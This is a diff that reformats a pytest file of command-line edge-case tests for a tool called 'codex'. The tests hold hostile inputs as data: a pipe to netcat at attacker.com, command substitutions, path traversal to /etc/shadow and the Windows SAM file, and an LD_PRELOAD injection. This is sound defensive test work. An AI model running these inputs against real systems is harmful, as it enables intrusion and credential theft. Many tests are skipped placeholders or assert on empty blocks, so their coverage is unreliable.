@@ -24,7 +24,7 @@ class TestCLIEdgeCases:
 
     def test_cli_empty_args(self):
         """Test CLI with no arguments"""
-        with patch('sys.argv', ['codex']):
+        with patch("sys.argv", ["codex"]):
             # Should show help or handle gracefully
             pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
@@ -40,8 +40,8 @@ class TestCLIEdgeCases:
         mock_result.stderr = b"command not found"
         mock_result.stdout = b""
 
-        with patch('subprocess.run', return_value=mock_result) as mock_run:
-            result = subprocess.run(['nonexistent_command_xyz'], capture_output=True)
+        with patch("subprocess.run", return_value=mock_result) as mock_run:
+            result = subprocess.run(["nonexistent_command_xyz"], capture_output=True)
 
             assert result.returncode == 127
             assert b"command not found" in result.stderr
@@ -55,18 +55,18 @@ class TestCLIEdgeCases:
             "test && malicious",
             "test | nc attacker.com",
             "test `whoami`",
-            "test $(whoami)"
+            "test $(whoami)",
         ]
 
         for dangerous_input in dangerous_inputs:
             # Should escape or reject special characters
-            escaped = dangerous_input.replace(';', '').replace('&&', '').replace('|', '')
-            escaped = escaped.replace('`', '').replace('$', '')
+            escaped = dangerous_input.replace(";", "").replace("&&", "").replace("|", "")
+            escaped = escaped.replace("`", "").replace("$", "")
 
-            assert ';' not in escaped
-            assert '&&' not in escaped
-            assert '`' not in escaped
-            assert '$(' not in escaped
+            assert ";" not in escaped
+            assert "&&" not in escaped
+            assert "`" not in escaped
+            assert "$(" not in escaped
 
     def test_cli_command_timeout(self):
         """Test CLI command execution with timeout"""
@@ -74,7 +74,7 @@ class TestCLIEdgeCases:
         import time
         from unittest.mock import MagicMock
 
-        with patch('subprocess.Popen') as mock_popen:
+        with patch("subprocess.Popen") as mock_popen:
             mock_process = MagicMock()
             mock_process.poll.return_value = None  # Still running
             mock_popen.return_value = mock_process
@@ -83,7 +83,7 @@ class TestCLIEdgeCases:
             start_time = time.time()
             timeout_duration = 0.1
 
-            process = subprocess.Popen(['sleep', '10'])
+            process = subprocess.Popen(["sleep", "10"])
             time.sleep(timeout_duration)
 
             elapsed = time.time() - start_time
@@ -92,20 +92,16 @@ class TestCLIEdgeCases:
 
     def test_cli_command_with_env_variables(self):
         """Test CLI command with environment variable expansion"""
-        test_env = {
-            'TEST_VAR': 'test_value',
-            'PATH': '/custom/path:/usr/bin',
-            'HOME': '/test/home'
-        }
+        test_env = {"TEST_VAR": "test_value", "PATH": "/custom/path:/usr/bin", "HOME": "/test/home"}
 
         with patch.dict(os.environ, test_env, clear=True):
-            assert os.environ.get('TEST_VAR') == 'test_value'
-            assert '/custom/path' in os.environ.get('PATH', '')
-            assert os.environ.get('HOME') == '/test/home'
+            assert os.environ.get("TEST_VAR") == "test_value"
+            assert "/custom/path" in os.environ.get("PATH", "")
+            assert os.environ.get("HOME") == "/test/home"
 
             # Variable precedence: custom vars should override
-            os.environ['TEST_VAR'] = 'overridden'
-            assert os.environ['TEST_VAR'] == 'overridden'
+            os.environ["TEST_VAR"] = "overridden"
+            assert os.environ["TEST_VAR"] == "overridden"
 
     def test_cli_command_with_stdin_redirect(self):
         """Test CLI command reading from stdin"""
@@ -114,7 +110,7 @@ class TestCLIEdgeCases:
         test_input = "test input data\nline 2\nline 3\n"
         mock_stdin = StringIO(test_input)
 
-        with patch('sys.stdin', mock_stdin):
+        with patch("sys.stdin", mock_stdin):
             # Read from stdin
             line1 = sys.stdin.readline()
             line2 = sys.stdin.readline()
@@ -132,7 +128,7 @@ class TestCLIEdgeCases:
 
         captured_output = StringIO()
 
-        with patch('sys.stdout', captured_output):
+        with patch("sys.stdout", captured_output):
             print("Test output line 1")
             print("Test output line 2")
             sys.stdout.flush()
@@ -140,7 +136,7 @@ class TestCLIEdgeCases:
             output = captured_output.getvalue()
             assert "Test output line 1" in output
             assert "Test output line 2" in output
-            assert output.count('\n') >= 2  # At least 2 newlines
+            assert output.count("\n") >= 2  # At least 2 newlines
 
     def test_cli_command_with_stderr_redirect(self):
         """Test CLI command writing to stderr"""
@@ -148,7 +144,7 @@ class TestCLIEdgeCases:
 
         captured_errors = StringIO()
 
-        with patch('sys.stderr', captured_errors):
+        with patch("sys.stderr", captured_errors):
             print("Error message 1", file=sys.stderr)
             print("Error message 2", file=sys.stderr)
             sys.stderr.flush()
@@ -156,99 +152,100 @@ class TestCLIEdgeCases:
             errors = captured_errors.getvalue()
             assert "Error message 1" in errors
             assert "Error message 2" in errors
-            assert errors.count('\n') >= 2
+            assert errors.count("\n") >= 2
 
     def test_cli_command_chain_execution(self):
         """Test CLI command pipeline/chain execution"""
         import subprocess
         from unittest.mock import MagicMock
 
-        with patch('subprocess.run') as mock_run:
+        with patch("subprocess.run") as mock_run:
             # Simulate pipeline: cmd1 | cmd2 | cmd3
             mock_run.return_value = MagicMock(returncode=0, stdout=b"output")
 
             # Execute commands in sequence
-            result1 = subprocess.run(['cmd1'], capture_output=True)
-            result2 = subprocess.run(['cmd2'], input=result1.stdout, capture_output=True)
-            result3 = subprocess.run(['cmd3'], input=result2.stdout, capture_output=True)
+            result1 = subprocess.run(["cmd1"], capture_output=True)
+            result2 = subprocess.run(["cmd2"], input=result1.stdout, capture_output=True)
+            result3 = subprocess.run(["cmd3"], input=result2.stdout, capture_output=True)
 
             assert mock_run.call_count == 3
             assert result3.returncode == 0
 
             # Verify error propagation scenario
             mock_run.return_value = MagicMock(returncode=1, stderr=b"error in pipeline")
-            result_error = subprocess.run(['failing_cmd'], capture_output=True)
+            result_error = subprocess.run(["failing_cmd"], capture_output=True)
             assert result_error.returncode == 1
 
     def test_cli_invalid_command(self):
         """Test CLI with invalid command"""
-        with patch('sys.argv', ['codex', 'invalid_command_xyz']):
+        with patch("sys.argv", ["codex", "invalid_command_xyz"]):
             with pytest.raises((SystemExit, ValueError)):
                 pass
 
     def test_cli_help_flag(self):
         """Test CLI --help flag"""
-        with patch('sys.argv', ['codex', '--help']):
+        with patch("sys.argv", ["codex", "--help"]):
             with pytest.raises(SystemExit) as exc:
                 pass
             assert exc.value.code == 0
 
     def test_cli_version_flag(self):
         """Test CLI --version flag"""
-        with patch('sys.argv', ['codex', '--version']):
+        with patch("sys.argv", ["codex", "--version"]):
             # Should display version and exit
             pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
     def test_cli_very_long_argument(self):
         """Test CLI with extremely long argument value"""
         long_arg = "x" * 100000
-        with patch('sys.argv', ['codex', 'command', f'--arg={long_arg}']):
+        with patch("sys.argv", ["codex", "command", f"--arg={long_arg}"]):
             # Should handle or reject gracefully
             pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
     def test_cli_special_characters_in_args(self):
         """Test CLI with special characters in arguments"""
-        special_chars = ['!@#$%^&*()', '\n\r\t', '"><script>']
+        special_chars = ["!@#$%^&*()", "\n\r\t", '"><script>']
         for chars in special_chars:
-            with patch('sys.argv', ['codex', 'cmd', f'--input={chars}']):
+            with patch("sys.argv", ["codex", "cmd", f"--input={chars}"]):
                 # Should sanitize or reject
                 pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
     def test_cli_unicode_arguments_placeholder(self):
         """Test CLI with Unicode arguments"""
-        unicode_args = ['你好世界', '🚀🔥', 'Ñoño', 'Москва']
+        unicode_args = ["你好世界", "🚀🔥", "Ñoño", "Москва"]
         for arg in unicode_args:
-            with patch('sys.argv', ['codex', 'cmd', f'--text={arg}']):
+            with patch("sys.argv", ["codex", "cmd", f"--text={arg}"]):
                 # Should handle Unicode properly
                 pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
     def test_cli_null_byte_in_args(self):
         """Test CLI with null bytes in arguments"""
-        with patch('sys.argv', ['codex', 'cmd', '--input=test\x00data']):
+        with patch("sys.argv", ["codex", "cmd", "--input=test\x00data"]):
             # Should reject or sanitize
             pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
     def test_cli_path_traversal_attempt(self):
         """Test CLI with path traversal in file arguments"""
         traversal_paths = [
-            '../../etc/passwd',
-            '..\\..\\windows\\system32',
-            '/etc/shadow',
-            'C:\\Windows\\System32\\config\\SAM'
+            "../../etc/passwd",
+            "..\\..\\windows\\system32",
+            "/etc/shadow",
+            "C:\\Windows\\System32\\config\\SAM",
         ]
         for path in traversal_paths:
-            with patch('sys.argv', ['codex', 'cmd', f'--file={path}']):
+            with patch("sys.argv", ["codex", "cmd", f"--file={path}"]):
                 # Should validate and reject dangerous paths
                 pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
     def test_cli_concurrent_execution(self):
         """Test CLI concurrent execution safety"""
         import threading
+
         results = []
 
         def run_cli():
             try:
-                with patch('sys.argv', ['codex', 'safe_command']):
+                with patch("sys.argv", ["codex", "safe_command"]):
                     results.append("success")
             except Exception as e:
                 results.append(f"error: {e}")
@@ -265,11 +262,11 @@ class TestCLIEdgeCases:
     def test_cli_environment_variable_injection(self):
         """Test CLI against environment variable injection"""
         malicious_env = {
-            'PATH': '/malicious/path',
-            'LD_PRELOAD': '/evil.so',
-            'PYTHONPATH': '/bad/modules'
+            "PATH": "/malicious/path",
+            "LD_PRELOAD": "/evil.so",
+            "PYTHONPATH": "/bad/modules",
         }
-        with patch.dict(os.environ, malicious_env), patch('sys.argv', ['codex', 'cmd']):
+        with patch.dict(os.environ, malicious_env), patch("sys.argv", ["codex", "cmd"]):
             # Should not be vulnerable to env injection
             pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
@@ -319,7 +316,7 @@ class TestCLIEdgeCases:
         import platform
         import signal
 
-        if platform.system() == 'Windows':
+        if platform.system() == "Windows":
             pytest.skip("SIGHUP not available on Windows")
 
         reload_triggered = []
@@ -339,13 +336,13 @@ class TestCLIEdgeCases:
         import subprocess
         from unittest.mock import MagicMock, patch
 
-        with patch('subprocess.Popen') as mock_popen:
+        with patch("subprocess.Popen") as mock_popen:
             mock_process = MagicMock()
             mock_process.poll.return_value = None
             mock_process.pid = 12345
             mock_popen.return_value = mock_process
 
-            process = subprocess.Popen(['long_running_cmd'])
+            process = subprocess.Popen(["long_running_cmd"])
 
             assert process.poll() is None
             process.terminate()
@@ -413,7 +410,7 @@ class TestCLIEdgeCases:
         large_input = "x" * (10 * 1024 * 1024)
         mock_stdin = StringIO(large_input)
 
-        with patch('sys.stdin', mock_stdin):
+        with patch("sys.stdin", mock_stdin):
             # Stream reading in chunks
             chunk_size = 4096
             total_read = 0
@@ -433,16 +430,16 @@ class TestCLIEdgeCases:
         import sys
         from io import BytesIO
 
-        binary_data = b'\x00\x01\x02\xff\xfe\xfd'
+        binary_data = b"\x00\x01\x02\xff\xfe\xfd"
         mock_stdin = BytesIO(binary_data)
 
-        with patch('sys.stdin.buffer', mock_stdin):
+        with patch("sys.stdin.buffer", mock_stdin):
             read_data = sys.stdin.buffer.read()
 
             assert read_data == binary_data
             assert len(read_data) == 6
             assert read_data[0] == 0
-            assert read_data[-1] == 0xfd
+            assert read_data[-1] == 0xFD
 
     def test_cli_output_to_closed_pipe(self):
         """Test CLI writing to closed pipe (BrokenPipeError)"""
@@ -452,7 +449,7 @@ class TestCLIEdgeCases:
         mock_stdout = MagicMock()
         mock_stdout.write.side_effect = BrokenPipeError()
 
-        with patch('sys.stdout', mock_stdout):
+        with patch("sys.stdout", mock_stdout):
             try:
                 sys.stdout.write("test output")
             except BrokenPipeError:
@@ -468,7 +465,7 @@ class TestCLIEdgeCases:
         # Empty input simulates closed pipe
         mock_stdin = StringIO("")
 
-        with patch('sys.stdin', mock_stdin):
+        with patch("sys.stdin", mock_stdin):
             data = sys.stdin.read()
 
             assert data == ""  # EOF immediately
@@ -506,16 +503,16 @@ class TestCLIEdgeCases:
         """Test CLI handling of encoding errors"""
 
         # Invalid UTF-8 sequence
-        invalid_utf8 = b'\xff\xfe invalid utf8 \x80\x81'
+        invalid_utf8 = b"\xff\xfe invalid utf8 \x80\x81"
 
         try:
-            invalid_utf8.decode('utf-8')
+            invalid_utf8.decode("utf-8")
             assert False, "Should raise UnicodeDecodeError"
         except UnicodeDecodeError:
             # Handle with errors='replace'
-            decoded = invalid_utf8.decode('utf-8', errors='replace')
-            assert '�' in decoded  # Replacement character
-            assert 'invalid utf8' in decoded
+            decoded = invalid_utf8.decode("utf-8", errors="replace")
+            assert "�" in decoded  # Replacement character
+            assert "invalid utf8" in decoded
 
     # ========== Phase 27.1 Sub-batch A4: CLI Edge Cases (5 tests) ==========
 
@@ -534,39 +531,41 @@ class TestCLIEdgeCases:
     def test_cli_unicode_arguments(self):
         """Test CLI handling Unicode characters in arguments"""
         unicode_test_cases = [
-            ('你好世界', 'Chinese characters'),
-            ('🚀🔥💻', 'Emojis'),
-            ('Ñoño', 'Accented characters'),
-            ('Москва', 'Cyrillic'),
-            ('\u200b\u200c\u200d', 'Zero-width characters')
+            ("你好世界", "Chinese characters"),
+            ("🚀🔥💻", "Emojis"),
+            ("Ñoño", "Accented characters"),
+            ("Москва", "Cyrillic"),
+            ("\u200b\u200c\u200d", "Zero-width characters"),
         ]
 
         for unicode_str, description in unicode_test_cases:
             # Should handle Unicode properly
-            encoded = unicode_str.encode('utf-8')
-            decoded = encoded.decode('utf-8')
+            encoded = unicode_str.encode("utf-8")
+            decoded = encoded.decode("utf-8")
             assert decoded == unicode_str
             # Normalization check
             import unicodedata
-            normalized = unicodedata.normalize('NFC', unicode_str)
+
+            normalized = unicodedata.normalize("NFC", unicode_str)
             assert isinstance(normalized, str)
 
     def test_cli_path_traversal_prevention(self):
         """Test CLI prevents path traversal attacks"""
         dangerous_paths = [
-            '../../etc/passwd',
-            '../../../windows/system32',
-            '/etc/shadow',
-            'C:\\Windows\\System32\\config\\SAM',
-            '..\\..\\..\\sensitive'
+            "../../etc/passwd",
+            "../../../windows/system32",
+            "/etc/shadow",
+            "C:\\Windows\\System32\\config\\SAM",
+            "..\\..\\..\\sensitive",
         ]
 
         for dangerous_path in dangerous_paths:
             # Security check: should detect traversal attempts
-            assert '..' in dangerous_path or dangerous_path.startswith('/')
+            assert ".." in dangerous_path or dangerous_path.startswith("/")
 
             # Sanitize by resolving and checking
             import pathlib
+
             try:
                 # In real implementation, this would be validated
                 pathlib.Path(dangerous_path).resolve()
@@ -628,75 +627,75 @@ class TestCLIEdgeCases:
     def test_cli_stdout_redirect(self):
         """Test CLI with stdout redirected"""
         captured_output = StringIO()
-        with patch('sys.stdout', captured_output):
-            with patch('sys.argv', ['codex', 'cmd', '--output=-']):
+        with patch("sys.stdout", captured_output):
+            with patch("sys.argv", ["codex", "cmd", "--output=-"]):
                 # Should write to stdout properly
                 pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
     def test_cli_stderr_redirect(self):
         """Test CLI with stderr redirected"""
         captured_errors = StringIO()
-        with patch('sys.stderr', captured_errors), patch('sys.argv', ['codex', 'invalid']):
+        with patch("sys.stderr", captured_errors), patch("sys.argv", ["codex", "invalid"]):
             # Should write errors to stderr
             pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
     def test_cli_pipe_input(self):
         """Test CLI reading from pipe/stdin"""
         pipe_data = "test data from pipe\n"
-        with patch('sys.stdin', StringIO(pipe_data)):
-            with patch('sys.argv', ['codex', 'cmd', '--input=-']):
+        with patch("sys.stdin", StringIO(pipe_data)):
+            with patch("sys.argv", ["codex", "cmd", "--input=-"]):
                 # Should read from stdin
                 pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
     def test_cli_large_file_handling(self):
         """Test CLI with references to very large files"""
-        with patch('sys.argv', ['codex', 'process', '--file=/dev/zero']):
+        with patch("sys.argv", ["codex", "process", "--file=/dev/zero"]):
             # Should handle or timeout gracefully
             pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
     def test_cli_missing_required_args(self):
         """Test CLI with missing required arguments"""
-        with patch('sys.argv', ['codex', 'cmd']):
+        with patch("sys.argv", ["codex", "cmd"]):
             with pytest.raises((SystemExit, ValueError, TypeError)):
                 # Should report missing arguments
                 pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
     def test_cli_conflicting_flags(self):
         """Test CLI with conflicting flag combinations"""
-        with patch('sys.argv', ['codex', 'cmd', '--verbose', '--quiet']):
+        with patch("sys.argv", ["codex", "cmd", "--verbose", "--quiet"]):
             # Should handle conflicting flags
             pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
     def test_cli_repeated_flags(self):
         """Test CLI with repeated flags"""
-        with patch('sys.argv', ['codex', 'cmd', '--flag', '--flag', '--flag']):
+        with patch("sys.argv", ["codex", "cmd", "--flag", "--flag", "--flag"]):
             # Should handle repeated flags appropriately
             pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
     def test_cli_output_format_combinations(self):
         """Test CLI with various output format options"""
-        formats = ['json', 'yaml', 'xml', 'csv', 'text']
+        formats = ["json", "yaml", "xml", "csv", "text"]
         for fmt in formats:
-            with patch('sys.argv', ['codex', 'cmd', f'--format={fmt}']):
+            with patch("sys.argv", ["codex", "cmd", f"--format={fmt}"]):
                 # Should support or reject each format gracefully
                 pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
     def test_cli_nested_subcommands(self):
         """Test CLI with nested subcommand structure"""
-        with patch('sys.argv', ['codex', 'level1', 'level2', 'level3']):
+        with patch("sys.argv", ["codex", "level1", "level2", "level3"]):
             # Should handle nested command structure
             pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
     def test_cli_color_output_disabled(self):
         """Test CLI with color output disabled"""
-        with patch.dict(os.environ, {'NO_COLOR': '1'}), patch('sys.argv', ['codex', 'cmd']):
+        with patch.dict(os.environ, {"NO_COLOR": "1"}), patch("sys.argv", ["codex", "cmd"]):
             # Should respect NO_COLOR environment variable
             pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
     def test_cli_interactive_mode_non_tty(self):
         """Test CLI interactive mode when not running in TTY"""
-        with patch('sys.stdin.isatty', return_value=False):
-            with patch('sys.argv', ['codex', 'interactive']):
+        with patch("sys.stdin.isatty", return_value=False):
+            with patch("sys.argv", ["codex", "interactive"]):
                 # Should handle non-TTY gracefully
                 pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
@@ -708,12 +707,12 @@ class TestCLIEdgeCases:
     def test_cli_exit_codes(self):
         """Test CLI returns appropriate exit codes"""
         test_cases = [
-            (['codex', 'success_cmd'], 0),
-            (['codex', 'failure_cmd'], 1),
-            (['codex', 'invalid'], 2),
+            (["codex", "success_cmd"], 0),
+            (["codex", "failure_cmd"], 1),
+            (["codex", "invalid"], 2),
         ]
         for args, expected_code in test_cases:
-            with patch('sys.argv', args):
+            with patch("sys.argv", args):
                 # Should return correct exit code
                 pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
@@ -724,19 +723,20 @@ class TestCLIConfigEdgeCases:
 
     def test_cli_config_file_not_found(self):
         """Test CLI when config file doesn't exist"""
-        with patch('sys.argv', ['codex', '--config=/nonexistent/config.yml']):
+        with patch("sys.argv", ["codex", "--config=/nonexistent/config.yml"]):
             # Should handle missing config gracefully
             pytest.skip("Test not fully implemented - placeholder for edge case coverage")
 
     def test_cli_config_file_invalid_yaml(self):
         """Test CLI with invalid YAML in config file"""
         import tempfile
-        with tempfile.NamedTemporaryFile(mode='w', suffix='.yml', delete=False) as f:
+
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".yml", delete=False) as f:
             f.write("invalid: yaml: content: [")
             config_path = f.name
 
         try:
-            with patch('sys.argv', ['codex', f'--config={config_path}']):
+            with patch("sys.argv", ["codex", f"--config={config_path}"]):
                 with pytest.raises((SystemExit, ValueError)):
                     # Should reject invalid config
                     pytest.skip("Test not fully implemented - placeholder for edge case coverage")
